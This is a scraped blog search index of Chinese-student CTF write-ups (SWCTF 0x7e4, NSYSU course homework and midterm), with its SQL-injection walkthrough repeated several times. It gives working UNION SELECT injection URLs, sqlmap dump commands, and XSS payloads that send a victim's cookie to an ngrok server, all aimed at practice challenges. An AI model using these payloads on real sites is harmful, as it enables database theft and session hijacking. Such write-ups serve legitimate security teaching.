SWCTF{C00K1eS_aR3_very_u53FuL} ","date":"2021-01-01","objectID":"/en/posts/2021/swctf-0x7e4-writeups/:17:0","series":null,"tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/en/posts/2021/swctf-0x7e4-writeups/#stupid-session-feng-chia-web-score-200"},{"categories":["Cyber Security"],"content":" Notifications (Feng Chia-Web, Score: 200)What does the problem setter like to eat? Guess correctly for flag https://swctf.hackersir.org:20202/ Please allow notifications for full experience Never planned to guess www. Neither option gives Flag ㄏ SWCTF{SeRVICE_woRker_n3w_SubsCRiber} ","date":"2021-01-01","objectID":"/en/posts/2021/swctf-0x7e4-writeups/:18:0","series":null,"tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/en/posts/2021/swctf-0x7e4-writeups/#notifications-feng-chia-web-score-200"},{"categories":["Cyber Security"],"content":" Popping Meow (Feng Chia-Reverse, Score: 200)Oh no, Pop Cat wants to chat, accidentally blocked the flag :/ Released file (apk) Rare apk reverse challenge, casually strings… eh? bash $ strings popping_meow.apk | grep \"CTF\" SWCTF{Ju1cY_Apk_resouRcES} ","date":"2021-01-01","objectID":"/en/posts/2021/swctf-0x7e4-writeups/:19:0","series":null,"tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/en/posts/2021/swctf-0x7e4-writeups/#popping-meow-feng-chia-reverse-score-200"},{"categories":["Cyber Security"],"content":" Python2Exe (Feng Chia-Reverse, Score: 239)Cao Cao is suspicious. Getting the flag requires shouting the allied password! Released file (exe) Tool challenge. Use pyinstxtractor, grep Flag from extracted files. SWCTF{PyThon_Scr1PT_kiddiES} ","date":"2021-01-01","objectID":"/en/posts/2021/swctf-0x7e4-writeups/:20:0","series":null,"tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/en/posts/2021/swctf-0x7e4-writeups/#python2exe-feng-chia-reverse-score-239"},{"categories":["Cyber Security"],"content":" password (NUTC-Reverse, Score: 200)Find the password if you can! Released file (exe) exe requests password, IDA reveals it. BTW, IDA shows output as SWCTF{ %c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c }, can’t figure how Flag string gets extracted == SWCTF{W33K_P455W0RD_XD} ","date":"2021-01-01","objectID":"/en/posts/2021/swctf-0x7e4-writeups/:21:0","series":null,"tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/en/posts/2021/swctf-0x7e4-writeups/#password-nutc-reverse-score-200"},{"categories":["Cyber Security"],"content":" func (NUTC-Reverse, Score: 275)Jump or not jump? Released file (exe) IDA reveals encryption logic. Simple decode script w python arr = [0, 3, 17, 29, 8, 60, 114, 60, 116, 13, 125, 17, 32, 52, 120, 122, 41, 11, 34, 58, 59, 33, 49] key = \"STRINGCHARINTFLOATDOUBLE\" flag = \"\".join([ chr((arr[i]) ^ ord(key[i])) for i in range(23) ]) print(flag) SWCTF{1t5_4_tr45h_func} ","date":"2021-01-01","objectID":"/en/posts/2021/swctf-0x7e4-writeups/:22:0","series":null,"tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/en/posts/2021/swctf-0x7e4-writeups/#func-nutc-reverse-score-275"},{"categories":["Cyber Security"],"content":" easy reverse (Providence-Reverse, Score: 200)Released file (exe) Opening move strings. Done. bash $ strings easy_reverse.exe | grep \"CTF\" SWCTF{fm42kb1.gvf} ","date":"2021-01-01","objectID":"/en/posts/2021/swctf-0x7e4-writeups/:23:0","series":null,"tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/en/posts/2021/swctf-0x7e4-writeups/#easy-reverse-providence-reverse-score-200"},{"categories":["Cyber Security"],"content":" Let’s Dance (Providence-Crypto, Score: 200, Unsolved)Sherlock Holmes substituted letters and used cipher from a past case to share with his assistant. In this case, the assistant left a message cipher on paper. This was… not knowing how to Google == Post-competition search “dancing man decode” solved it XD Don’t use dcode.fr’s table - too many details become painful == Also Flag is all lowercase, ignore the flags in the image (thanks MuMu) Simple challenges still have people who can’t solve - yes, me QQ Anyway, strange knowledge increased.jpg SWCTF{the_murderer_is_the_author} ","date":"2021-01-01","objectID":"/en/posts/2021/swctf-0x7e4-writeups/:24:0","series":null,"tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/en/posts/2021/swctf-0x7e4-writeups/#lets-dance-providence-crypto-score-200-unsolved"},{"categories":["Cyber Security"],"content":" Prison life (Providence-Crypto, Score: 392, Unsolved)Maybe learning to communicate with prisoners is important. Released file (txt) Initially thought dots meant Morse code, then searched wrong directions from title Orz Actually Tap code - now I can chat in prison too (X) Online tool: https://cryptii.com/pipes/tap-code SWCTF{yiyuejidingwanshanwuzu} ","date":"2021-01-01","objectID":"/en/posts/2021/swctf-0x7e4-writeups/:25:0","series":null,"tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/en/posts/2021/swctf-0x7e4-writeups/#prison-life-providence-crypto-score-392-unsolved"},{"categories":["Cyber Security"],"content":" Many more unsolved challenges…(See original for full list - including Historic Site Tour, GIForever, Special RAR, What Does the Wolf Say, 耗子尾汁, Real Google, Base-XX, babyCPP, C Minor, disseminate, My first SQL Injection, Google It Yourself, Stupid Session Revenge, admin) Official writeups: https://hackmd.io/@swctf/writeups ","date":"2021-01-01","objectID":"/en/posts/2021/swctf-0x7e4-writeups/:26:0","series":null,"tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/en/posts/2021/swctf-0x7e4-writeups/#many-more-unsolved-challenges"},{"categories":["Cyber Security"],"content":"NSYSU Hacking and Countermeasures course homework 2 writeups","date":"2020-12-09","objectID":"/en/posts/2020/nsysu-htcf-hw2/","series":null,"tags":["NSYSU Hacking Attack \u0026 Defense","CTF-Writeup"],"title":"[NSYSU Hacking Attack \u0026 Defense] HW 0x02 Writeups","uri":"/en/posts/2020/nsysu-htcf-hw2/"},{"categories":["Cyber Security"],"content":"Writeups from MacacaHub HTCF HW 0x02 Author: @stavhaygn Writeup By: @yctseng1227 Both challenges came from this year’s CISC2020 - Day 1 basic web security practice organized by our MacacaHub team. It was unfortunate that we couldn’t cover the full course in 3 hours. As a MacacaHub TA, I couldn’t give up - faced with similar challenges this time, I solved them quickly \u003ew\u003c!! ","date":"2020-12-09","objectID":"/en/posts/2020/nsysu-htcf-hw2/:0:0","series":null,"tags":["NSYSU Hacking Attack \u0026 Defense","CTF-Writeup"],"title":"[NSYSU Hacking Attack \u0026 Defense] HW 0x02 Writeups","uri":"/en/posts/2020/nsysu-htcf-hw2/#"},{"categories":["Cyber Security"],"content":" news (160 points)","date":"2020-12-09","objectID":"/en/posts/2020/nsysu-htcf-hw2/:1:0","series":null,"tags":["NSYSU Hacking Attack \u0026 Defense","CTF-Writeup"],"title":"[NSYSU Hacking Attack \u0026 Defense] HW 0x02 Writeups","uri":"/en/posts/2020/nsysu-htcf-hw2/#news-160-points"},{"categories":["Cyber Security"],"content":" DescriptionI pronounce it SQL. No wait, it should be SQL! Though my friends all say SQL, I think it should be SQL. But I say SQL. https://news.macacahub.tw/ ","date":"2020-12-09","objectID":"/en/posts/2020/nsysu-htcf-hw2/:1:1","series":null,"tags":["NSYSU Hacking Attack \u0026 Defense","CTF-Writeup"],"title":"[NSYSU Hacking Attack \u0026 Defense] HW 0x02 Writeups","uri":"/en/posts/2020/nsysu-htcf-hw2/#description"},{"categories":["Cyber Security"],"content":" SolutionAt first glance it’s an ordinary bulletin board. Clicking any post shows the URL has an id parameter. The title hints SQL injection (SQLi), so we can directly target the id parameter as injection point. For this type of database query SQLi, we can use UNION SELECT to query pages that display information. First step, use ORDER BY to guess the number of table columns. http https://news.macacahub.tw/new.php?id=1 ORDER BY 3 # success https://news.macacahub.tw/new.php?id=1 ORDER BY 4 # fail Tip Usually such SQLi uses #, -- etc. to comment out the system’s trailing statements, but this challenge has no other queries so we can omit it w Also note that URLs are usually URL encoded (e.g. (space) = ‘%20’) Testing shows id’s data type is integer, and ORDER BY 4 shows no page, meaning the query table has 3 columns. Now we can use UNION SELECT to chain other SQL queries (note: column count after UNION SELECT must match the previous statement). Next, we try to find a page with no normal query results (e.g. id=6) to display our SQLi results. With the column count we found, let’s try 1, 2, 3 XD http https://news.macacahub.tw/new.php?id=6 UNION SELECT 1,2,3 OK success! Now we can use SQL queries to extract desired information, like SQL version. http https://news.macacahub.tw/new.php?id=6 UNION SELECT @@version,NULL,NULL MySQL’s version query @@version works successfully. Next, we need the current database name. http https://news.macacahub.tw/new.php?id=6 UNION SELECT DATABASE(),NULL,NULL DATABASE() is a SQL function, easily getting our target database! Being a hacker is that simple Database name is newsdb. Next, find table names. http https://news.macacahub.tw/new.php?id=6 UNION SELECT GROUP_CONCAT(table_name),NULL,NULL FROM information_schema.tables WHERE table_schema=database() Tip Note: without GROUP_CONCAT wrapping table_name, the SQL query returns after finding the first match, not all matching results. This involves SQL structure. information_schema is a special schema descriptor in relational databases like MySQL, used to store database metadata. For details, see Feifei’s Web Security Wizard Guide - SQL injection Opening Move. Anyway, using SQL query we get two tables: FLAGS and News. We intuitively guess Flag is in FLAGS, bulletin messages in News! Though the TA might have switched them to mess with people Next, let’s see the column info in the table. http https://news.macacahub.tw/new.php?id=6 UNION SELECT GROUP_CONCAT(column_name),NULL,NULL FROM information_schema.columns WHERE table_schema=database() and table_name='FLAGS' Tip Remember to use GROUP_CONCAT() for column_name too to get all info. If you want more challenge, use LIMIT to poke slowly (lol) Only two columns: id and flag. Just extract our Flag using column names! http https://news.macacahub.tw/new.php?id=6 UNION SELECT id,flag,NULL FROM FLAGS For more SQLi payloads: https://portswigger.net/web-security/sql-injection/cheat-sheet Of course you can manually poke around, but as otaku we need time for our 2D waifus. Using sqlmap tool makes the above SQLi faster, similar flow. Find Database name bash $ sqlmap -u https://news.macacahub.tw/new.php\\?id\\=1 --dbs Find Table name bash $ sqlmap -u https://news.macacahub.tw/new.php\\?id\\=1 -D newsdb --tables Find column type bash $ sqlmap -u https://news.macacahub.tw/new.php\\?id\\=1 -D newsdb -T FLAGS --columns Dump target FLAGS bash $ sqlmap -u https://news.macacahub.tw/new.php\\?id\\=1 -D newsdb -T FLAGS --dump Or use brute force approach - just DUMP everything! bash $ sqlmap -u https://news.macacahub.tw/new.php\\?id\\=1 --dump So aggressive ","date":"2020-12-09","objectID":"/en/posts/2020/nsysu-htcf-hw2/:1:2","series":null,"tags":["NSYSU Hacking Attack \u0026 Defense","CTF-Writeup"],"title":"[NSYSU Hacking Attack \u0026 Defense] HW 0x02 Writeups","uri":"/en/posts/2020/nsysu-htcf-hw2/#solution"},{"categories":["Cyber Security"],"content":" SolutionAt first glance it’s an ordinary bulletin board. Clicking any post shows the URL has an id parameter. The title hints SQL injection (SQLi), so we can directly target the id parameter as injection point. For this type of database query SQLi, we can use UNION SELECT to query pages that display information. First step, use ORDER BY to guess the number of table columns. http https://news.macacahub.tw/new.php?id=1 ORDER BY 3 # success https://news.macacahub.tw/new.php?id=1 ORDER BY 4 # fail Tip Usually such SQLi uses #, -- etc. to comment out the system’s trailing statements, but this challenge has no other queries so we can omit it w Also note that URLs are usually URL encoded (e.g. (space) = ‘%20’) Testing shows id’s data type is integer, and ORDER BY 4 shows no page, meaning the query table has 3 columns. Now we can use UNION SELECT to chain other SQL queries (note: column count after UNION SELECT must match the previous statement). Next, we try to find a page with no normal query results (e.g. id=6) to display our SQLi results. With the column count we found, let’s try 1, 2, 3 XD http https://news.macacahub.tw/new.php?id=6 UNION SELECT 1,2,3 OK success! Now we can use SQL queries to extract desired information, like SQL version. http https://news.macacahub.tw/new.php?id=6 UNION SELECT @@version,NULL,NULL MySQL’s version query @@version works successfully. Next, we need the current database name. http https://news.macacahub.tw/new.php?id=6 UNION SELECT DATABASE(),NULL,NULL DATABASE() is a SQL function, easily getting our target database! Being a hacker is that simple Database name is newsdb. Next, find table names. http https://news.macacahub.tw/new.php?id=6 UNION SELECT GROUP_CONCAT(table_name),NULL,NULL FROM information_schema.tables WHERE table_schema=database() Tip Note: without GROUP_CONCAT wrapping table_name, the SQL query returns after finding the first match, not all matching results. This involves SQL structure. information_schema is a special schema descriptor in relational databases like MySQL, used to store database metadata. For details, see Feifei’s Web Security Wizard Guide - SQL injection Opening Move. Anyway, using SQL query we get two tables: FLAGS and News. We intuitively guess Flag is in FLAGS, bulletin messages in News! Though the TA might have switched them to mess with people Next, let’s see the column info in the table. http https://news.macacahub.tw/new.php?id=6 UNION SELECT GROUP_CONCAT(column_name),NULL,NULL FROM information_schema.columns WHERE table_schema=database() and table_name='FLAGS' Tip Remember to use GROUP_CONCAT() for column_name too to get all info. If you want more challenge, use LIMIT to poke slowly (lol) Only two columns: id and flag. Just extract our Flag using column names! http https://news.macacahub.tw/new.php?id=6 UNION SELECT id,flag,NULL FROM FLAGS For more SQLi payloads: https://portswigger.net/web-security/sql-injection/cheat-sheet Of course you can manually poke around, but as otaku we need time for our 2D waifus. Using sqlmap tool makes the above SQLi faster, similar flow. Find Database name bash $ sqlmap -u https://news.macacahub.tw/new.php\\?id\\=1 --dbs Find Table name bash $ sqlmap -u https://news.macacahub.tw/new.php\\?id\\=1 -D newsdb --tables Find column type bash $ sqlmap -u https://news.macacahub.tw/new.php\\?id\\=1 -D newsdb -T FLAGS --columns Dump target FLAGS bash $ sqlmap -u https://news.macacahub.tw/new.php\\?id\\=1 -D newsdb -T FLAGS --dump Or use brute force approach - just DUMP everything! bash $ sqlmap -u https://news.macacahub.tw/new.php\\?id\\=1 --dump So aggressive ","date":"2020-12-09","objectID":"/en/posts/2020/nsysu-htcf-hw2/:1:2","series":null,"tags":["NSYSU Hacking Attack \u0026 Defense","CTF-Writeup"],"title":"[NSYSU Hacking Attack \u0026 Defense] HW 0x02 Writeups","uri":"/en/posts/2020/nsysu-htcf-hw2/#find-database-name"},{"categories":["Cyber Security"],"content":" SolutionAt first glance it’s an ordinary bulletin board. Clicking any post shows the URL has an id parameter. The title hints SQL injection (SQLi), so we can directly target the id parameter as injection point. For this type of database query SQLi, we can use UNION SELECT to query pages that display information. First step, use ORDER BY to guess the number of table columns. http https://news.macacahub.tw/new.php?id=1 ORDER BY 3 # success https://news.macacahub.tw/new.php?id=1 ORDER BY 4 # fail Tip Usually such SQLi uses #, -- etc. to comment out the system’s trailing statements, but this challenge has no other queries so we can omit it w Also note that URLs are usually URL encoded (e.g. (space) = ‘%20’) Testing shows id’s data type is integer, and ORDER BY 4 shows no page, meaning the query table has 3 columns. Now we can use UNION SELECT to chain other SQL queries (note: column count after UNION SELECT must match the previous statement). Next, we try to find a page with no normal query results (e.g. id=6) to display our SQLi results. With the column count we found, let’s try 1, 2, 3 XD http https://news.macacahub.tw/new.php?id=6 UNION SELECT 1,2,3 OK success! Now we can use SQL queries to extract desired information, like SQL version. http https://news.macacahub.tw/new.php?id=6 UNION SELECT @@version,NULL,NULL MySQL’s version query @@version works successfully. Next, we need the current database name. http https://news.macacahub.tw/new.php?id=6 UNION SELECT DATABASE(),NULL,NULL DATABASE() is a SQL function, easily getting our target database! Being a hacker is that simple Database name is newsdb. Next, find table names. http https://news.macacahub.tw/new.php?id=6 UNION SELECT GROUP_CONCAT(table_name),NULL,NULL FROM information_schema.tables WHERE table_schema=database() Tip Note: without GROUP_CONCAT wrapping table_name, the SQL query returns after finding the first match, not all matching results. This involves SQL structure. information_schema is a special schema descriptor in relational databases like MySQL, used to store database metadata. For details, see Feifei’s Web Security Wizard Guide - SQL injection Opening Move. Anyway, using SQL query we get two tables: FLAGS and News. We intuitively guess Flag is in FLAGS, bulletin messages in News! Though the TA might have switched them to mess with people Next, let’s see the column info in the table. http https://news.macacahub.tw/new.php?id=6 UNION SELECT GROUP_CONCAT(column_name),NULL,NULL FROM information_schema.columns WHERE table_schema=database() and table_name='FLAGS' Tip Remember to use GROUP_CONCAT() for column_name too to get all info. If you want more challenge, use LIMIT to poke slowly (lol) Only two columns: id and flag. Just extract our Flag using column names! http https://news.macacahub.tw/new.php?id=6 UNION SELECT id,flag,NULL FROM FLAGS For more SQLi payloads: https://portswigger.net/web-security/sql-injection/cheat-sheet Of course you can manually poke around, but as otaku we need time for our 2D waifus. Using sqlmap tool makes the above SQLi faster, similar flow. Find Database name bash $ sqlmap -u https://news.macacahub.tw/new.php\\?id\\=1 --dbs Find Table name bash $ sqlmap -u https://news.macacahub.tw/new.php\\?id\\=1 -D newsdb --tables Find column type bash $ sqlmap -u https://news.macacahub.tw/new.php\\?id\\=1 -D newsdb -T FLAGS --columns Dump target FLAGS bash $ sqlmap -u https://news.macacahub.tw/new.php\\?id\\=1 -D newsdb -T FLAGS --dump Or use brute force approach - just DUMP everything! bash $ sqlmap -u https://news.macacahub.tw/new.php\\?id\\=1 --dump So aggressive ","date":"2020-12-09","objectID":"/en/posts/2020/nsysu-htcf-hw2/:1:2","series":null,"tags":["NSYSU Hacking Attack \u0026 Defense","CTF-Writeup"],"title":"[NSYSU Hacking Attack \u0026 Defense] HW 0x02 Writeups","uri":"/en/posts/2020/nsysu-htcf-hw2/#find-table-name"},{"categories":["Cyber Security"],"content":" SolutionAt first glance it’s an ordinary bulletin board. Clicking any post shows the URL has an id parameter. The title hints SQL injection (SQLi), so we can directly target the id parameter as injection point. For this type of database query SQLi, we can use UNION SELECT to query pages that display information. First step, use ORDER BY to guess the number of table columns. http https://news.macacahub.tw/new.php?id=1 ORDER BY 3 # success https://news.macacahub.tw/new.php?id=1 ORDER BY 4 # fail Tip Usually such SQLi uses #, -- etc. to comment out the system’s trailing statements, but this challenge has no other queries so we can omit it w Also note that URLs are usually URL encoded (e.g. (space) = ‘%20’) Testing shows id’s data type is integer, and ORDER BY 4 shows no page, meaning the query table has 3 columns. Now we can use UNION SELECT to chain other SQL queries (note: column count after UNION SELECT must match the previous statement). Next, we try to find a page with no normal query results (e.g. id=6) to display our SQLi results. With the column count we found, let’s try 1, 2, 3 XD http https://news.macacahub.tw/new.php?id=6 UNION SELECT 1,2,3 OK success! Now we can use SQL queries to extract desired information, like SQL version. http https://news.macacahub.tw/new.php?id=6 UNION SELECT @@version,NULL,NULL MySQL’s version query @@version works successfully. Next, we need the current database name. http https://news.macacahub.tw/new.php?id=6 UNION SELECT DATABASE(),NULL,NULL DATABASE() is a SQL function, easily getting our target database! Being a hacker is that simple Database name is newsdb. Next, find table names. http https://news.macacahub.tw/new.php?id=6 UNION SELECT GROUP_CONCAT(table_name),NULL,NULL FROM information_schema.tables WHERE table_schema=database() Tip Note: without GROUP_CONCAT wrapping table_name, the SQL query returns after finding the first match, not all matching results. This involves SQL structure. information_schema is a special schema descriptor in relational databases like MySQL, used to store database metadata. For details, see Feifei’s Web Security Wizard Guide - SQL injection Opening Move. Anyway, using SQL query we get two tables: FLAGS and News. We intuitively guess Flag is in FLAGS, bulletin messages in News! Though the TA might have switched them to mess with people Next, let’s see the column info in the table. http https://news.macacahub.tw/new.php?id=6 UNION SELECT GROUP_CONCAT(column_name),NULL,NULL FROM information_schema.columns WHERE table_schema=database() and table_name='FLAGS' Tip Remember to use GROUP_CONCAT() for column_name too to get all info. If you want more challenge, use LIMIT to poke slowly (lol) Only two columns: id and flag. Just extract our Flag using column names! http https://news.macacahub.tw/new.php?id=6 UNION SELECT id,flag,NULL FROM FLAGS For more SQLi payloads: https://portswigger.net/web-security/sql-injection/cheat-sheet Of course you can manually poke around, but as otaku we need time for our 2D waifus. Using sqlmap tool makes the above SQLi faster, similar flow. Find Database name bash $ sqlmap -u https://news.macacahub.tw/new.php\\?id\\=1 --dbs Find Table name bash $ sqlmap -u https://news.macacahub.tw/new.php\\?id\\=1 -D newsdb --tables Find column type bash $ sqlmap -u https://news.macacahub.tw/new.php\\?id\\=1 -D newsdb -T FLAGS --columns Dump target FLAGS bash $ sqlmap -u https://news.macacahub.tw/new.php\\?id\\=1 -D newsdb -T FLAGS --dump Or use brute force approach - just DUMP everything! bash $ sqlmap -u https://news.macacahub.tw/new.php\\?id\\=1 --dump So aggressive ","date":"2020-12-09","objectID":"/en/posts/2020/nsysu-htcf-hw2/:1:2","series":null,"tags":["NSYSU Hacking Attack \u0026 Defense","CTF-Writeup"],"title":"[NSYSU Hacking Attack \u0026 Defense] HW 0x02 Writeups","uri":"/en/posts/2020/nsysu-htcf-hw2/#find-column-type"},{"categories":["Cyber Security"],"content":" SolutionAt first glance it’s an ordinary bulletin board. Clicking any post shows the URL has an id parameter. The title hints SQL injection (SQLi), so we can directly target the id parameter as injection point. For this type of database query SQLi, we can use UNION SELECT to query pages that display information. First step, use ORDER BY to guess the number of table columns. http https://news.macacahub.tw/new.php?id=1 ORDER BY 3 # success https://news.macacahub.tw/new.php?id=1 ORDER BY 4 # fail Tip Usually such SQLi uses #, -- etc. to comment out the system’s trailing statements, but this challenge has no other queries so we can omit it w Also note that URLs are usually URL encoded (e.g. (space) = ‘%20’) Testing shows id’s data type is integer, and ORDER BY 4 shows no page, meaning the query table has 3 columns. Now we can use UNION SELECT to chain other SQL queries (note: column count after UNION SELECT must match the previous statement). Next, we try to find a page with no normal query results (e.g. id=6) to display our SQLi results. With the column count we found, let’s try 1, 2, 3 XD http https://news.macacahub.tw/new.php?id=6 UNION SELECT 1,2,3 OK success! Now we can use SQL queries to extract desired information, like SQL version. http https://news.macacahub.tw/new.php?id=6 UNION SELECT @@version,NULL,NULL MySQL’s version query @@version works successfully. Next, we need the current database name. http https://news.macacahub.tw/new.php?id=6 UNION SELECT DATABASE(),NULL,NULL DATABASE() is a SQL function, easily getting our target database! Being a hacker is that simple Database name is newsdb. Next, find table names. http https://news.macacahub.tw/new.php?id=6 UNION SELECT GROUP_CONCAT(table_name),NULL,NULL FROM information_schema.tables WHERE table_schema=database() Tip Note: without GROUP_CONCAT wrapping table_name, the SQL query returns after finding the first match, not all matching results. This involves SQL structure. information_schema is a special schema descriptor in relational databases like MySQL, used to store database metadata. For details, see Feifei’s Web Security Wizard Guide - SQL injection Opening Move. Anyway, using SQL query we get two tables: FLAGS and News. We intuitively guess Flag is in FLAGS, bulletin messages in News! Though the TA might have switched them to mess with people Next, let’s see the column info in the table. http https://news.macacahub.tw/new.php?id=6 UNION SELECT GROUP_CONCAT(column_name),NULL,NULL FROM information_schema.columns WHERE table_schema=database() and table_name='FLAGS' Tip Remember to use GROUP_CONCAT() for column_name too to get all info. If you want more challenge, use LIMIT to poke slowly (lol) Only two columns: id and flag. Just extract our Flag using column names! http https://news.macacahub.tw/new.php?id=6 UNION SELECT id,flag,NULL FROM FLAGS For more SQLi payloads: https://portswigger.net/web-security/sql-injection/cheat-sheet Of course you can manually poke around, but as otaku we need time for our 2D waifus. Using sqlmap tool makes the above SQLi faster, similar flow. Find Database name bash $ sqlmap -u https://news.macacahub.tw/new.php\\?id\\=1 --dbs Find Table name bash $ sqlmap -u https://news.macacahub.tw/new.php\\?id\\=1 -D newsdb --tables Find column type bash $ sqlmap -u https://news.macacahub.tw/new.php\\?id\\=1 -D newsdb -T FLAGS --columns Dump target FLAGS bash $ sqlmap -u https://news.macacahub.tw/new.php\\?id\\=1 -D newsdb -T FLAGS --dump Or use brute force approach - just DUMP everything! bash $ sqlmap -u https://news.macacahub.tw/new.php\\?id\\=1 --dump So aggressive ","date":"2020-12-09","objectID":"/en/posts/2020/nsysu-htcf-hw2/:1:2","series":null,"tags":["NSYSU Hacking Attack \u0026 Defense","CTF-Writeup"],"title":"[NSYSU Hacking Attack \u0026 Defense] HW 0x02 Writeups","uri":"/en/posts/2020/nsysu-htcf-hw2/#dump-target-flags"},{"categories":["Cyber Security"],"content":" error messages (220 points)","date":"2020-12-09","objectID":"/en/posts/2020/nsysu-htcf-hw2/:2:0","series":null,"tags":["NSYSU Hacking Attack \u0026 Defense","CTF-Writeup"],"title":"[NSYSU Hacking Attack \u0026 Defense] HW 0x02 Writeups","uri":"/en/posts/2020/nsysu-htcf-hw2/#error-messages-220-points"},{"categories":["Cyber Security"],"content":" DescriptionTell jokes to admin to get session https://message.macacahub.tw/ hint: One of government websites’ favorite usernames user Since solve count was low, TA added extra hints: Tip bonus 1: Find XSS injection point on login page bonus 2: XAMPP quick setup + remember to use public IP (or ngrok tunneling) bonus 3: admin will simulate real person clicking your link (joke) ","date":"2020-12-09","objectID":"/en/posts/2020/nsysu-htcf-hw2/:2:1","series":null,"tags":["NSYSU Hacking Attack \u0026 Defense","CTF-Writeup"],"title":"[NSYSU Hacking Attack \u0026 Defense] HW 0x02 Writeups","uri":"/en/posts/2020/nsysu-htcf-hw2/#description-1"},{"categories":["Cyber Security"],"content":" SolutionThis challenge has two parts: a. Weak password Weak password - simple memorable ones like admin:password. From hint “Taiwan government websites’ favorite username user”, plus developers often setting identical username/password, this challenge can be accidentally logged in with user : user. b. XSS Login failure error message “Incorrect username or password” also appears in URL as msg parameter. We can test there and find XSS vulnerability. After weak password login, we can’t get Flag since we’re not admin. The site provides an input box to tell jokes to admin. Entering “C8763” was called not funny QQ From hint “admin simulates real person clicking your link”, we need to use the XSS vulnerability to make admin click and steal admin’s session, then modify webpage cookie to get Flag. We need to set up a server to receive admin’s session. Below terminal left shows local server. Without public IP, we need ngrok reverse proxy tool. Right side shows mapping local port to public IP, allowing external access to our server. For web beginners, brief explanation of quick server setup. P.S. Python 3.6 environment bash $ sudo pip3 install flask $ sudo pip3 install flask_cors $ python3 app.py Code reference: app.py Using login page XSS vulnerability to test getting local cookie. Payload needs redirect public IP, using escape or fetch to capture cookie. Note: for string concatenation, + must be changed to %2B (URL encode) or browser treats it as space causing failure. Or use concat(). Two approaches: html https://message.macacahub.tw/login.php?msg=\u003cscript\u003elocation.href=\"https://\u003ctunnel_id\u003e.ngrok.io/?c=\"%2Bescape(document.cookie)\u003c/script\u003e https://message.macacahub.tw/login.php?msg=\u003cscript\u003efetch('https://\u003ctunnel_id\u003e.ngrok.io/?c='.concat(document.cookie))\u003c/script\u003e Once we successfully steal local cookie, we log in and feed the “full URL” as a joke to admin. Admin clicks the URL and sends their session to our server, LOL. Finally, use F12 or tools (e.g. Chrome’s EditThisCookie) to replace cookie with admin’s cookie, refresh page, get Flag. ","date":"2020-12-09","objectID":"/en/posts/2020/nsysu-htcf-hw2/:2:2","series":null,"tags":["NSYSU Hacking Attack \u0026 Defense","CTF-Writeup"],"title":"[NSYSU Hacking Attack \u0026 Defense] HW 0x02 Writeups","uri":"/en/posts/2020/nsysu-htcf-hw2/#solution-1"},{"categories":["Cyber Security"],"content":"NSYSU Hacking and Countermeasures course midterm writeups","date":"2020-11-09","objectID":"/en/posts/2020/nsysu-htcf-midterm-writeups/","series":null,"tags":["NSYSU Hacking Attack \u0026 Defense","CTF-Writeup"],"title":"[NSYSU Hacking Attack \u0026 Defense] Midterm Writeups","uri":"/en/posts/2020/nsysu-htcf-midterm-writeups/"},{"categories":["Cyber Security"],"content":" Writeups from MacacaHub HTCF Midterm writeups Author: @stavhaygn Writeup By: @yctseng1227 This Hacking Attack \u0026 Defense exam had written test (1hr) \u0026 practical exam (2hr) - basically Golden Shield Competition 2.0. Time allocation made it difficult to clear all challenges. Plus, to prevent cheating, we had to take screenshots while solving for simple reports (so troublesome). Difficulty was medium-easy in my opinion, since the TA followed the professor’s teaching direction (even some extended learning). But most classmates lacked CTF experience making it somewhat difficult - the professor eventually suggested adding more basic challenges next time XDDDDDD As usual, here’s my score proof. Lost 1st place to a MacacaHub junior, so sad (The only wrong one was a typo in the Flag image, life stain) ","date":"2020-11-09","objectID":"/en/posts/2020/nsysu-htcf-midterm-writeups/:0:0","series":null,"tags":["NSYSU Hacking Attack \u0026 Defense","CTF-Writeup"],"title":"[NSYSU Hacking Attack \u0026 Defense] Midterm Writeups","uri":"/en/posts/2020/nsysu-htcf-midterm-writeups/#"},{"categories":["Cyber Security"],"content":" Scoreboard ","date":"2020-11-09","objectID":"/en/posts/2020/nsysu-htcf-midterm-writeups/:1:0","series":null,"tags":["NSYSU Hacking Attack \u0026 Defense","CTF-Writeup"],"title":"[NSYSU Hacking Attack \u0026 Defense] Midterm Writeups","uri":"/en/posts/2020/nsysu-htcf-midterm-writeups/#scoreboard"},{"categories":["Cyber Security"],"content":" Forensics","date":"2020-11-09","objectID":"/en/posts/2020/nsysu-htcf-midterm-writeups/:2:0","series":null,"tags":["NSYSU Hacking Attack \u0026 Defense","CTF-Writeup"],"title":"[NSYSU Hacking Attack \u0026 Defense] Midterm Writeups","uri":"/en/posts/2020/nsysu-htcf-midterm-writeups/#forensics"},{"categories":["Cyber Security"],"content":" images 0x1 (100 points, 23 solves) Descriptionimages~ images~ images~ hint: flag is in the image Released file (pcap) Solution Note Heard many people solved this cleanly with NetworkMiner(?) But packet count was low during exam so I didn’t think much - my approach is more manual Opening .pcap with wireshark, Follow \u003e TCP Stream shows roughly 10 streams. Many contain .png headers as shown. Use File \u003e Export Objects \u003e HTTP... to dump specified files (focus on multipart/form-data). Save all files, then use hex editor to fix image headers according to PNG. After fixing images, Flag is visible. About five images total - I randomly poked and got the Flag haha ","date":"2020-11-09","objectID":"/en/posts/2020/nsysu-htcf-midterm-writeups/:2:1","series":null,"tags":["NSYSU Hacking Attack \u0026 Defense","CTF-Writeup"],"title":"[NSYSU Hacking Attack \u0026 Defense] Midterm Writeups","uri":"/en/posts/2020/nsysu-htcf-midterm-writeups/#images-0x1-100-points-23-solves"},{"categories":["Cyber Security"],"content":" images 0x1 (100 points, 23 solves) Descriptionimages~ images~ images~ hint: flag is in the image Released file (pcap) Solution Note Heard many people solved this cleanly with NetworkMiner(?) But packet count was low during exam so I didn’t think much - my approach is more manual Opening .pcap with wireshark, Follow \u003e TCP Stream shows roughly 10 streams. Many contain .png headers 